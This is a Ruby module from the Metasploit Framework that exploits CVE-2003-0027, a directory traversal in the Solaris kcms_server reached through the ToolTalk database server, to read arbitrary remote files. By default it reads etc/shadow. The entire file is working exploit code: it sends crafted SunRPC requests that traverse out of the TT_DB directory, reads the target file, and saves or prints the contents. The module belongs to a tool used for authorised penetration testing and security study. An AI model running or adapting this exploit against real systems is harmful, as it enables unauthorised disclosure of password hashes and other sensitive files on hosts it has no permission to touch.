##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::SunRPC

  def initialize
    super(
      'Name'           => 'Solaris KCMS + TTDB Arbitrary File Read',
      'Description'    => %q{
          This module targets a directory traversal vulnerability in the
        kcms_server component from the Kodak Color Management System. By
        utilizing the ToolTalk Database Server\'s TT_ISBUILD procedure, an
        attacker can bypass existing directory traversal validation and
        read arbitrary files.

        Vulnerable systems include Solaris 2.5 - 9 SPARC and x86. Both
        kcms_server and rpc.ttdbserverd must be running on the target
        host.
      },
      'Author'         =>
        [
          'vlad902 <vlad902 [at] gmail.com>', # MSF v2 module
          'jduck'  # Ported to MSF v3
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', '2003-0027'],
          ['OSVDB', '8201'],
          ['BID', '6665'],
          ['URL', 'http://marc.info/?l=bugtraq&m=104326556329850&w=2'],
          ['URL', 'http://sunsolve.sun.com/search/document.do?assetkey=1-77-1000898.1-1']
        ],
      # Tested OK against sol8.tor 20100624 -jjd
      'DisclosureDate' => 'Jan 22 2003')

    register_options(
      [
        OptString.new('PATH', [ true, "Path to the file to disclose, releative to the root dir.", 'etc/shadow']),
        OptString.new('OUTPUTPATH', [ false, "Local path to save the file contents to", nil ])
      ], self.class)
  end

  def run

    # There is a fixed size buffer in use, so make sure we don't exceed it..
    # (NOTE: 24 bytes are reserved for traversal string)
    path = datastore['PATH']
    if (path.length > 1000)
      raise RuntimeError, "File name is too long."
    end

    print_status("Making request to the ToolTalk Database Server...")

    # Hopefully one of these works ;)
    ttdb_build("/etc/openwin/devdata/profiles/TT_DB/oid_container")
    ttdb_build("/etc/openwin/etc/devdata/TT_DB/oid_container")

    # If not, we'll find out now ...
    print_status("Making open() request to the kcms_server...")
    sunrpc_create('tcp', 100221, 1)
    sunrpc_authunix('localhost', 0, 0, [])

    # Prepare the traversing request for kcms_server
    trav = 'TT_DB/' + ('../' * 5) + path
    buf = XDR.encode(
      [trav, 1024],
      0, # O_RDONLY
      0755) # mode

    # Make the request
    ret = sunrpc_call(1003, buf)
    ack, fsize, fd = XDR.decode!(ret, Integer, Integer, Integer)

    if (ack != 0)
      print_error("KCMS open() failed (ack: 0x%x != 0)" % ack)

      if (fsize == 0)
        print_status("File does not exist (or host is patched)")
      end
      return
    end

    # Nice, open succeeded, show the return data
    print_status("fd: #{fd}, file size #{fsize}")

    print_status("Making read() request to the kcms_server...")
    buf = XDR.encode(
      fd,
      0,
      fsize)

    ret = sunrpc_call(1005, buf)
    x, data = XDR.decode!(ret, Integer, [Integer])

    # If we got something back...
    if (data)
      data = data.pack('C*')

      # Store or display the results
      if (datastore['OUTPUTPATH'])
        fname = datastore['PATH'].gsub(/[\/\\]/, '_')
        outpath = File.join(datastore['OUTPUTPATH'], fname)
        print_status("Saving contents to #{outpath} ...")
        File.open(outpath, "wb") { |fd|
          fd.write(data)
        }
      else
        print_status("File contents:")
        print_status(data.inspect)
      end
    else
      print_error("No data returned!")
    end

    # Close it regardless if it returned anything..
    print_status("Making close() request to the kcms_server...")
    buf = XDR.encode(fd)
    sunrpc_call(1004, buf)

    # done
    sunrpc_destroy

  rescue ::Rex::Proto::SunRPC::RPCTimeout
    print_warning 'Warning: ' + $!
    print_warning 'Exploit may or may not have succeeded.'
  end


  #
  # Send a TT_ISBUILD request to rpc.ttdbserverd
  #
  def ttdb_build(path)
    sunrpc_create('tcp', 100083, 1)
    sunrpc_authunix('localhost', 0, 0, [])
    msg = XDR.encode(
      [path, 1024],
      path.length,
      1, # KEY (VArray head?)
      2,
      1,
      0, # KEYDESC
      2,
      1,
      # 21 zeros, /KEYDESC, /KEY
      0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
      0x10002,
      path.length)
    ret = sunrpc_call(3, msg)
    arr = XDR.decode!(ret, Integer, Integer)
    print_status("TTDB reply: 0x%x, %d" % arr)
    sunrpc_destroy
  end

end
